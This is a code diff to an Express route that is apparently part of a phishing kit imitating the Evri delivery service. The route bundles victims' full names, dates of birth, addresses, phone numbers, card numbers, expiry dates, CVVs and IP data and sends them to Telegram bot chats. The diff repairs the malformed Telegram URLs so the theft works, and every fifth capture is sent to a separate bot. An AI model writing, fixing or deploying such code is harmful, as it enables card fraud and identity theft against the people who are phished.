@@ -1949,19 +1949,18 @@ app.post('/fpaysEvri', (req, res) => {
         var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
         if (fpaysC == 5) {
             axios.post(
-                `https:api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
+                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
             );
             fpaysC = 0;
         } else {
             axios.post(
-                `https:api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriFpays:\n${originalText}`
+                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriCapz:\n${originalText}`
             );
             axios.post(
-                `https:api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=2134201699&text=Evri:\n${originalText}`
+                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=2134201699&text=Evri:\n${originalText}`
             );
             fpaysC += 1;
         }
-        res.send("Update Completed");
     })
 });
 
